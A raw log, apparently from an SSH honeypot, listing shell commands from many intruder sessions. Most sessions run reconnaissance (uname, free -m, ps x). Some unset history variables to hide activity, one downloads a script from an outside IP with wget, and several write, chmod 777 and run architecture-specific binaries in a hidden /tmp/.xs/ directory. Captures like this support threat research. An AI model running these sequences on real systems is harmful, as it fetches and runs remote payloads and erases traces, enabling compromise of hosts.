64534d10cf144134828f6d5e8750b6c9	unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
64534d10cf144134828f6d5e8750b6c9	history -n
64534d10cf144134828f6d5e8750b6c9	exit
38e20534323a45d0a136fdd952cd8f81	uname
38e20534323a45d0a136fdd952cd8f81	free -m
38e20534323a45d0a136fdd952cd8f81	ps x
b9743f16b12448f08a39cad8a1430ddb	unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
b9743f16b12448f08a39cad8a1430ddb	history -n
b9743f16b12448f08a39cad8a1430ddb	exit
492a3cbec3f146c78e3d6285703f8b18	uname
492a3cbec3f146c78e3d6285703f8b18	free -m
492a3cbec3f146c78e3d6285703f8b18	ps x
c38913ebb6b9463eaa851f50632c969f	cd /tmp
c38913ebb6b9463eaa851f50632c969f	wget http://208.67.1.142/hack/Binarys.sh
1bdccc02bbf7452e883999e0a3d00f2d	uname
1bdccc02bbf7452e883999e0a3d00f2d	free -m
1bdccc02bbf7452e883999e0a3d00f2d	ps x
518dd698e14a4049a5c7df392dd74ba5	uname
518dd698e14a4049a5c7df392dd74ba5	free -m
518dd698e14a4049a5c7df392dd74ba5	ps x
db36867330274421a90248aa1794ae5f	help
e66794b4ca204fea824e5f6b84595165	help
a1e23fa612884fac9505030cf6403753	uname
a1e23fa612884fac9505030cf6403753	free -m
a1e23fa612884fac9505030cf6403753	ps x
36b622276f454e6482e23f3c1a05c1e5	uname
36b622276f454e6482e23f3c1a05c1e5	free -m
36b622276f454e6482e23f3c1a05c1e5	ps x
2b7a404a68634af194bcaf99e0e40615	uname
2b7a404a68634af194bcaf99e0e40615	free -m
2b7a404a68634af194bcaf99e0e40615	ps x
00818a69b597437f9c6b4aea04b9fe5a	uname
00818a69b597437f9c6b4aea04b9fe5a	free -m
00818a69b597437f9c6b4aea04b9fe5a	ps x
a0e9d6954a754dd796e286ba11e637b5	uname
a0e9d6954a754dd796e286ba11e637b5	free -m
a0e9d6954a754dd796e286ba11e637b5	ps x
bff7c13330ab4e23b851965f093dbcf9	uname
bff7c13330ab4e23b851965f093dbcf9	free -m
bff7c13330ab4e23b851965f093dbcf9	ps x
e4e24ca9152a4994aad3d1f44833ce59	uname
e4e24ca9152a4994aad3d1f44833ce59	free -m
e4e24ca9152a4994aad3d1f44833ce59	ps x
a82d01b8131c4e24945d1b20afb77968	uname
a82d01b8131c4e24945d1b20afb77968	free -m
a82d01b8131c4e24945d1b20afb77968	ps x
facb1d23dcdb4cf29b8a228399b58483	echo -n test
facb1d23dcdb4cf29b8a228399b58483	cat /proc/version
2a4991353ab74bbdb553e92056c07a1b	mkdir /tmp/.xs/
2a4991353ab74bbdb553e92056c07a1b	cat  > /tmp/.xs/daemon.armv4l.mod
2a4991353ab74bbdb553e92056c07a1b	chmod 777 /tmp/.xs/daemon.armv4l.mod
2a4991353ab74bbdb553e92056c07a1b	/tmp/.xs/daemon.armv4l.mod
59d1a12578004ec4a6a5dce2cfd7e6ae	mkdir /tmp/.xs/
59d1a12578004ec4a6a5dce2cfd7e6ae	cat  > /tmp/.xs/daemon.i686.mod
59d1a12578004ec4a6a5dce2cfd7e6ae	chmod 777 /tmp/.xs/daemon.i686.mod
59d1a12578004ec4a6a5dce2cfd7e6ae	/tmp/.xs/daemon.i686.mod
0f7ac6e3af554246a03c47ed682b61a0	mkdir /tmp/.xs/
0f7ac6e3af554246a03c47ed682b61a0	cat  > /tmp/.xs/daemon.mips.mod
0f7ac6e3af554246a03c47ed682b61a0	chmod 777 /tmp/.xs/daemon.mips.mod
0f7ac6e3af554246a03c47ed682b61a0	/tmp/.xs/daemon.mips.mod
8f8750449d42498eb8ade9a9cfebc984	mkdir /tmp/.xs/
8f8750449d42498eb8ade9a9cfebc984	cat  > /tmp/.xs/daemon.armv4l.mod
8f8750449d42498eb8ade9a9cfebc984	chmod 777 /tmp/.xs/daemon.armv4l.mod
8f8750449d42498eb8ade9a9cfebc984	/tmp/.xs/daemon.armv4l.mod
57b3d2f1f0df4751a665a0763f4f09f3	mkdir /tmp/.xs/
57b3d2f1f0df4751a665a0763f4f09f3	cat  > /tmp/.xs/daemon.i686.mod
57b3d2f1f0df4751a665a0763f4f09f3	chmod 777 /tmp/.xs/daemon.i686.mod
57b3d2f1f0df4751a665a0763f4f09f3	/tmp/.xs/daemon.i686.mod
